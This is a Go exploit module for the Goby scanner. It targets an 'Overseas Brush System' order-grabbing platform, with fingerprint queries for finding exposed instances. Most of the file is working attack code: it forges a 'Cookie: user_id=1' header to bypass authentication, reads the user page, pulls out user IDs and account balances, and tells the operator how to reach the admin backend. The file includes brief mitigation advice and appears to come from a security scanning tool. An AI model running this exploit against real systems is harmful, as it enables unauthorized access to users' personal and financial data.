package exploits

import (
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Overseas Brush System /index Permission Bypass Vulnerability",
    "Description": "<p>Overseas order grabbing and swiping system, with user risk value, last order time, with three-level distribution, authority agent background, recharge and withdrawal, background query and other functions. </p><p>There is a permission bypass vulnerability in the overseas order grabbing and swiping system, through which unauthenticated users can enter the background, which ultimately leads to the system being in an extremely insecure state.</p>",
    "Product": "Overseas Brush System",
    "Homepage": "https://www.aikeh.com/post-5.html",
    "DisclosureDate": "2024-09-18",
    "PostTime": "2024-10-15",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "body=\"/red/popper.min.js\" && body=\"/red/jquery.cookie.js\"",
    "GobyQuery": "body=\"/red/popper.min.js\" && body=\"/red/jquery.cookie.js\"",
    "Level": "1",
    "Impact": "<p>There is a permission bypass vulnerability in the overseas order grabbing and swiping system, through which unauthenticated users can enter the background, which ultimately leads to the system being in an extremely insecure state.</p>",
    "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls. </p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://blog.csdn.net/weixin_45790890/article/details/142211338"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "userMessage,default",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Permission Bypass"
    ],
    "VulType": [
        "Permission Bypass"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.0",
    "Translation": {
        "CN": {
            "Name": "海外抢单刷单系统 /index 权限绕过漏洞",
            "Product": "海外抢单刷单系统",
            "Description": "<p>海外抢单刷单系统，拥有用户风险值、最后做单时间，带三级分销，权限代理后台，充值提现、后台查询等功能。</p><p>海外抢单刷单系统存在权限绕过漏洞，未经身份认证的用户可以通过该漏洞进入后台，最终导致系统处于极度不安全状态。<br></p>",
            "Recommendation": "<p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。&nbsp;</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>海外抢单刷单系统存在权限绕过漏洞，未经身份认证的用户可以通过该漏洞进入后台，最终导致系统处于极度不安全状态。<br></p>",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "Overseas Brush System /index Permission Bypass Vulnerability",
            "Product": "Overseas Brush System",
            "Description": "<p>Overseas order grabbing and swiping system, with user risk value, last order time, with three-level distribution, authority agent background, recharge and withdrawal, background query and other functions.&nbsp;</p><p>There is a permission bypass vulnerability in the overseas order grabbing and swiping system, through which unauthenticated users can enter the background, which ultimately leads to the system being in an extremely insecure state.<br></p>",
            "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls.&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>There is a permission bypass vulnerability in the overseas order grabbing and swiping system, through which unauthenticated users can enter the background, which ultimately leads to the system being in an extremely insecure state.<br></p>",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9961"
}`
	postOrGet_scajifuhasyufgtkasjhfjasgyfhhdvsdfvuihsdfghuisylghv := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		respTxt := ""
		requestConfig := httpclient.NewGetRequestConfig(fileUrl)
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		requestConfig.Header.Store("Cookie", "user_id=1")
		resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig)
		if err != nil || resp.StatusCode != 200 {
			err = errors.New("failed to read file")
			return "", err
		}
		respTxt = resp.RawBody
		// 注意：返回值为（最终要返回的读取结果，错误）
		return respTxt, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/index/my/index.html"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"/index/my/index.html": "/index/my/edit_username",
			}
			// 函数继承
			uploadFileFunc := postOrGet_scajifuhasyufgtkasjhfjasgyfhhdvsdfvuihsdfghuisylghv

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"userMessage": {"/index/my/index.html", "/index/my/edit_username"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_scajifuhasyufgtkasjhfjasgyfhhdvsdfvuihsdfghuisylghv

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "default" {
				expResult.Success = true
				expResult.Output = "Please use 'Cookie: user_id=1' to access the backend URL:/index/index to enter the backend"
				return expResult
			}
			if _, ok := defaultModeMap[mode]; ok {
				fileUrl = defaultModeMap[mode][0]
				fileText = defaultModeMap[mode][1]
			} else {
				expResult.Success = false
				return expResult
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "default") {
				expResult.Success = false
				return expResult
			}
			pattern := `<b id="foo">((.|\n)*?)</b></span>`
			// 编译正则表达式
			re := regexp.MustCompile(pattern)
			if !re.MatchString(resp) {
				expResult.Success = true
				expResult.Output = resp
				return expResult
			}
			// 在文本中查找匹配项
			match := re.FindStringSubmatch(resp)

			expResult.Output = "User ID: " + match[1]

			pattern = `10px">((.|\n)*?)</h3></div>`
			// 编译正则表达式
			re = regexp.MustCompile(pattern)
			if !re.MatchString(resp) {
				expResult.Success = true
				expResult.Output = resp
				return expResult
			}
			// 在文本中查找匹配项
			match = re.FindStringSubmatch(resp)

			expResult.Success = true
			expResult.Output += "\r\nUser Money: " + match[1]
			return expResult
		},
	))
}
